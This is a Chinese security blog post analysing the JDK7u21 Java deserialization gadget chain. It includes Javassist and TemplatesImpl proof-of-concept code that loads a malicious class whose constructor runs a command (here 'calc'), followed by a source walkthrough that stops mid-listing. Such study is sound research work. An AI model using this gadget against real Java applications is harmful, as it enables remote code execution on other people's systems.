@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一开始是学习FastJson反序列化的POC，然后发现欠缺不少知识，遂来补一下，收获良多，总结下笔记 所谓JDK反序列化Gadgets就是不同于利用Apache-CommonsCollections这种外部库，而是只利用JDK自带的类所构造的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDK7u21反序列化Gadgets">
+<meta property="og:url" content="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="一开始是学习FastJson反序列化的POC，然后发现欠缺不少知识，遂来补一下，收获良多，总结下笔记 所谓JDK反序列化Gadgets就是不同于利用Apache-CommonsCollections这种外部库，而是只利用JDK自带的类所构造的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222150342279.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155450171.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155814347.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160020838.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160124453.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160514649.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160756476.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200618469.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200653974.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200740551.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222201701982.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222225202662.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203051744.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220213982.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220451248.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222204446774.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210434857.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210525096.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210905902.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222211521556.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230037778.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223127808.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223209538.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230700698.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000229937.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000741750.png">
+<meta property="og:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223001156031.png">
+<meta property="article:published_time" content="2020-02-22T06:01:00.000Z">
+<meta property="article:modified_time" content="2020-04-28T10:20:22.000Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Java反序列化漏洞">
+<meta property="article:tag" content="JDK7u21">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222150342279.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/","path":"2020/02/22/JDK7u21反序列化Gadgets/","title":"JDK7u21反序列化Gadgets"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JDK7u21反序列化Gadgets | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Javassist"><span class="nav-number">1.</span> <span class="nav-text">Javassist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplatesImpl"><span class="nav-number">2.</span> <span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">动态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AnnotationInvocationHandler"><span class="nav-number">4.</span> <span class="nav-text">AnnotationInvocationHandler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">Hash绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#map-put%E7%9A%84%E4%BD%8D%E7%BD%AE%E9%97%AE%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">map.put的位置问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JDK7u21反序列化Gadgets | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JDK7u21反序列化Gadgets
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-02-22 14:01:00" itemprop="dateCreated datePublished" datetime="2020-02-22T14:01:00+08:00">2020-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2020-04-28 18:20:22" itemprop="dateModified" datetime="2020-04-28T18:20:22+08:00">2020-04-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>一开始是学习FastJson反序列化的POC，然后发现欠缺不少知识，遂来补一下，收获良多，总结下笔记</p>
+<p>所谓JDK反序列化Gadgets就是不同于利用Apache-CommonsCollections这种外部库，而是只利用JDK自带的类所构造的</p>
+<span id="more"></span>
+
+<p>先下载并配置好<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">JDK7u21</a></p>
+<h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>为了理解POC构造过程，还需要学习一些前置知识，Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含 Java 类或接口，Javassist 就是一个用来 处理 Java 字节码的类库</p>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        System.out.println(Arrays.toString(byteCode));</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;D:/Evil/&quot;</span>);<span class="comment">//将字节码写到D:/Evil/</span></span><br><span class="line"></span><br><span class="line">        cc.toClass().newInstance();<span class="comment">//得到Evil类类对象，借助反射构建Evil对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将D:&#x2F;Evil&#x2F;Evil.calss拖入IDEA即可反编译，可以看见javassist动态构建出了如下类</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222150342279.png" alt="image-20200222150342279"></p>
+<p>至于为什么要继承AbstractTranslet，和构造函数中写命令执行的payload就涉及到下面POC的构造，暂时只需要了解javassist的大概功能</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>之前参考网上分析文章的POC是从<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>中修改得来的，代码中使用了ysoserial的一些类，我修改了一下将POC核心部分单独提取出来方便理解</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要就是利用了<code>TemplatesImpl</code>，向其中的<code>_bytecodes</code>属性赋值了一个恶意类，最终该恶意类被实例化并且调用了构造函数中的命令执行payload。javassist在这里的作用呢其实主要就是构建这么一个恶意类，并且得到其字节码用以给<code>TemplatesImpl</code>相关属性赋值，所以可以自行编译一个恶意类并读入字节码来使用</p>
+<p>但会发现这里其实反序列化<code>TemplatesImpl</code>后还需要调用<code>getOutputProperties()</code>方法才能触发，不过在FastJson中已经可以形成完整利用链</p>
+<p>在<code>getOutputProperties()</code>函数下断点，跟踪一下执行过程</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155450171.png"></p>
+<p>强制进入该函数</p>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155814347.png"></p>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160020838.png" alt="image-20200222160020838"></p>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</p>
+<p>这里得到POC中两项属性的构造条件，即<code>_name</code>不能为null，<code>_class</code>为null，然后进入<code>defineTransletClasses()</code></p>
+<p>其实最终的触发点就在380行<code>_class[_transletIndex].newInstance()</code>，<code>defineTransletClasses()</code>是对<code>_class</code>和<code>_transletIndex</code>赋值</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160124453.png" alt="image-20200222160124453"></p>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160514649.png" alt="image-20200222160514649"></p>
+<p>代码比较长这里就直接复制出来了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//_bytecodes不能为null</span></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">/*在JDK7u80这一段代码是不同的</span></span><br><span class="line"><span class="comment">                TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span></span><br><span class="line"><span class="comment">                所以为了兼容JDK7u80，_tfactory需要存在findClassLoader()方法，即TransformerFactoryImpl类*/</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取_bytecodes长度并创建_class数组，所以POC中将恶意类的字节码转换为一个二维字节数组，new byte[][]&#123;byteCode&#125;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span 